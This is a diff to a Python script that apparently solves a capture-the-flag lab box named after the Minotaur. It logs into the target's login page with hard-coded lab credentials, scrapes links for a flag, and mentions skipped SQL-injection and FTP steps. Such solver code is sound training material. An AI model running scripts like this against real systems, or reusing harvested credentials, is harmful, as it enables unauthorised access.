@@ -7,19 +7,22 @@ import requests as req
 import sys
 import pprint
 import socket
+from bs4 import BeautifulSoup
 from os import dup2
 from subprocess import run
 
 tar_ip = sys.argv[1] #target IP
+sess = req.Session()
 
-def Mino_web_engine():
-    sess = req.Session()
-    url = f'http://{tar_ip}/login.php'
-    PostData = {'email': 'Daedalus', 'password': 'g2e55kh4ck5r'}
-    sess.post(url, data=PostData)
+#First flag is on the ftp server but i went ahead without it(sorry). So now its a TODO for lator
 
-    sec_url = f'http://{tar_ip}/index.php'
-    RetReq = sess.get(sec_url)
-    print(RetReq.text)
+def Mino_web_engine_login(): #Not going to cover the sql bit as i dont think its necessary and its time consuming to get a response back. I might add a seperate script to the repo that will take care of it
+    url_L = f'http://{tar_ip}/login.php'
+    PostData_L = {'email': 'M!n0taur', 'password': 'aminotauro'}
+    res = sess.post(url_L, data=PostData_L)
+    soup = BeautifulSoup(res.content, "html.parser")
 
-Mino_web_engine()
+    fetch_href_flag = soup.find_all("a") #Out of my limited knowledge of this library, this is the best i can do for now.
+    print(fetch_href_flag)
+
+Mino_web_engine_login()
